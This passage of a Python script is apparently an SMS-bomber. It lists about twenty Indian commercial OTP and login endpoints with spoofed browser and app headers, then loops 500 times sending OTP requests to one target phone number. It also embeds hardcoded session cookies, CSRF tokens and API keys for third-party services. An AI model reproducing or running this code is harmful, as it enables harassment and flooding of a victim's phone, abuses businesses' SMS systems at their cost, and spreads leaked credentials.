                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://induseasywheels.indusind.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://induseasywheels.indusind.com/customer/account/create/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        
        {
            "url": "https://webapi.magicpin.in/ultron-onboarding/merchant/sendOtpWithMessage",
            "method": "POST",
            "data": {
                "phone": number,
                "message": "login",
                "appVersion": 30207
            },
            "headers": {
                "Host": "webapi.magicpin.in",
                "version-code": "30207",
                "version-name": "MAGICPINPARTNER0.7.6",
                "accept-encoding": "gzip",
                "client": "android",
                "content-type": "application/json",
               # "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/3.12.12"
            }
        },
       
        {
            "url": "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction",
            "method": "POST",
            "data": {
                "control": "GET_OTP",
                "sMobileOrEmailOperation": "MOBILE",
                "sOperation": "REGISTRATION",
                "sUserName": number,
                "isAjax": "true"
            },
            "headers": {
                'Host': 'www.khelplayrummy.com',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.khelplayrummy.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.khelplayrummy.com/login',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        
        {
            "url": "https://api.payrup.com/api/auth/otp/generate",
            "method": "POST",
            "headers": {
                'Host': 'api.payrup.com',
                'Content-Length': '29',
                'Accept': 'application/json',
                'Pr-App-Source': 'web-prod-1.3.1',
                'Authorization': 'null',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://payrup.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://payrup.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            },
            "data": {
                "mobileNumber": number
            }
        },
        {
            "url": "https://api.playo.io/onboard/generateOTP",
            "method": "POST",
            "headers": {
                "Host": "api.playo.io",
                "Content-Length": "43",
                "Accept": "application/json",
                "Authorization": "undefined",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Origin": "https://playo.co",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://playo.co/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
            },
            "data": {
                "countryCode": "+91",
                "mobile": number
            }
        },
        {
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/signup",
            "method": "POST",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "63ca8a21-b875-40ba-a67b-ae1b3017c26c",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip",
            },
            "data": {
                "mobile": number,
                "email": "dhiii@gmail.com",
                "referral_code": None,
                "geo_region_id": None,
            }
        },
        
        {
            "url": 'https://www.railmitra.com/auth/request',
            "method": "POST",
            "headers": {
                'accept': '*/*',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.railmitra.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.railmitra.com/login',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'cookie': 'player_id=null; us=eyJpdiI6IjV4VHRYSHhHcHEyN2U5NVdkNDZpSVE9PSIsInZhbHVlIjoiRDRZS3pmKzdaUXFMZjR6Y0VvbTJuQT09IiwibWFjIjoiYTFhMTQ2MzYwZDVkNmJmMTdjNzJjNGMwMzFiYjg4ZTNjZGNkNDAzNTVlZDQ1YmU0OGM4NmM4ZDBmMGUwOGMzMSJ9; um=eyJpdiI6IjlcL2I0TEpYMGt1N2pzZ09CSkRjSTdBPT0iLCJ2YWx1ZSI6IjZcL2VsXC96aFBTMVR6cFllMmVQRXppUT09IiwibWFjIjoiNWZmMDkxODUxNTNhMzE0Y2M0NWZkYzM5NDRkMGU4Y2JkMDc3Y2ZiMTA1N2NkOTAxNDhlNDc1MmNjYmY3YzY0ZSJ9; PHPSESSID=uv35i9v7pkenldv6418967j1g6; _ga=GA1.1.345813858.1693419808; _ga_2KR10QJ4Q1=GS1.1.1693419808.1.0.1693419808.60.0.0; rm_session=eyJpdiI6ImordnZNTFI2S3NnYWdvQzhaUGRtbkE9PSIsInZhbHVlIjoiS08wb3BTXC85MmNKT1ZcL21zK0tJTmhrNWdqVUUzbTk4Y2Noa0ZtazdxZGIrdE4rNmp0N2c4ZEZZcFZhMUgxb0VcLyIsIm1hYyI6ImNiODNkMmZhZDE5Nzg3ODhiMGVmNjFlYzM2NDBjZTNlYTIwZjgzNDU2ZDIxYmNjYjU1NDYxYmM4Y2FiMDdkNWMifQ%3D%3D;',
            },
            "data": {
                '_token': 'ohIga6oZ4xZTjzfVOE3ucWYpNcexJeWY2ywUVc67',
                'username': number,
                'remember': '',
            }
        },
        
        {
            "url": f"https://exampurapi.classx.co.in/get/sendotp?phone={number}",
            "headers": {
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'source': 'website',
                'user_app_category': '9',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'accept': '*/*',
                'origin': 'https://app.exampur.com',
                'x-requested-with': 'pure.lite.browser',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://app.exampur.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
            },
            "method": "GET",
            "params": {}
        },
        {
            "url": "https://udaan.com/login?cmd=send",
            "headers": {
                "Content-type": "application/x-www-form-urlencoded",
                "Origin": "https://udaan.com",
                "Referer": "https://udaan.com/login",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "Cookie": "d=pl3WYnNNMhhxHCSb4cKW06DwaefDGGV1X; s=vsycymfl6ykga6vb9438fo11; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18c86ab03f465f-0b6f3b4a9ce344-6d3b2a09-50580-18c86ab03f5660%22%2C%22%24device_id%22%3A%20%2218c86ab03f465f-0b6f3b4a9ce344-6d3b2a09-50580-18c86ab03f5660%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D"
            },
            "method": "POST",
            "data": {
                "try_count": "0",
                "mobile": number
            }
        },
        {
            "url": f'https://abmeat.com/client/login/{number}/6436',
            "headers": {
                'Host': 'abmeat.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://abmeat.com/order/ab-meat-mehdipatnam-hyderabad',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
            },
            "method": "GET",
            "params": {},
            "cookies": {
                'PHPSESSID': '1u68bgu21c9mddmu3vm954600c',
                'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229236f4b6633be68624660e7fd97539b2%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22132.154.1.229%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Linux%3B+Android+13%3B+SM-A235F+Build%2FTP1A.220624.014%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrom%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1703254490%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D1dab7d1069b8faa936f67052b7ad55b7',
                'view_outlet': 'Hyderabad',
                'view_business': '6439',
                'slug': 'ab-meat-mehdipatnam-hyderabad',
                'view_locality': 'Mehdipatnam',
                '_ga': 'GA1.1.729356824.1703254492',
                '_ga_RS6GJ805M5': 'GS1.1.1703254499.1.0.1703254499.0.0.0',
                '_ga_X47KM2JJB4': 'GS1.1.1703254491.1.1.1703254500.0.0.0',
            }
        },
        {
            "url": f"https://api.dotshowroom.in/api/dotk/vo1/user/login/{number}?source=digital_showroom&domain=https://onlinemeat.in/cart",
            "headers": {
                'Host': 'api.dotshowroom.in',
                'auth_token': 'null',
                # Add other headers as needed
            },
            "method": "GET",
            "params": {}
        },
        
        {
            "url": 'https://v2api.medbuzz.in/app/Generate_User_OTP',
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                # Add other headers as needed
            },
            "method": "POST",
            "data": {
                "DeviceID": "10cfa12bd7ccb9b4",
                "ApiKey": "0d064a14-959c-40b5-9089-07629d97bc39",
                "CountryCode": "91",
                "PhoneNumber": number
            }
        },
        
        {
            "url": 'https://m.parveentravels.com/user/send-otp',
            "headers": {},
            "method": "POST",
            "data": {
                'mobileNumber': number,
            }
        },
        {
            "url": 'https://m.goldenbus.in/user/send-otp',
            "method": "POST",
            "headers": {
                'Host': 'm.goldenbus.in',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://m.goldenbus.in',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://m.goldenbus.in/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'Cookie': 'ci_session=n35io77smvn5h69kd75fd59q7se34181',
            },
            "data": {
                'mobileNumber': number,
            }
        },
        {
            "url": 'https://apis.bakingo.com/api/bakingo/fa/users/sendOtp',
            "method": "POST",
            "params": {
                'user_mobile': number,
                'user_email': "shivam66@gmail.com",
                'resend_otp': "0",
                'bk-source': "app"
            },
            "headers": {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'user-agent': 'okhttp/4.9.2'
                # Add other headers as needed
            },
            "data": {}
        },
        {
            "url": f"https://api.msg91.com/api/v5/otp?template_id=64468855d6fc05280a11bb92&mobile=+91{number}",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "accept": "application/json",
                "authkey": "368530Am0qtTWL16478537dP1",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {}  # Empty JSON payload as indicated in your request
        },
        {
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=ovenstory_android&app_version=10242&device_id=10cfa12bd7ccb9b4",
            "method": "POST",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "10",
                "app-version": "10242",
                "client-os": "ovenstory_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "sms"
            }
        },
        
        {
            "url": "https://parksmart.in/website/sendLink",
            "method": "POST",
            "headers": {
                "Host": "parksmart.in",
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://parksmart.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobile_number": number
            }
        },
        {
            "url": "https://jsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp",
            "method": "POST",
            "headers": {
                "Host": "jsso.indiatimes.com",
                "content-length": str(len(str(number))),
                "captchatoken": "",
                "csrftoken": "",
                "sdkversion": "0.7.2",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "content-type": "application/json",
                "isjssocrosswalk": "true",
                "channel": "timesprime",
                "platform": "WAP",
                "ssec": "",
                "csut": "",
                "gdpr": "",
                "accept": "*/*",
                "origin": "https://www.timesprime.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.timesprime.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "cookie": "deviceid=4qk52ej5h7utmufbjxgvw9dhe; lgc_deviceid=4qk52ej5h7utmufbjxgvw9dhe",
            },
            "data": {
                "mobile": number
            }
        }
        
    ]
    
    # Run the requests for 20 times
    for _ in range(500):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
           # print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        #time.sleep(1)

# Example usage:
#smsgi("932")  # Replace "9442" with the phone number you want to use
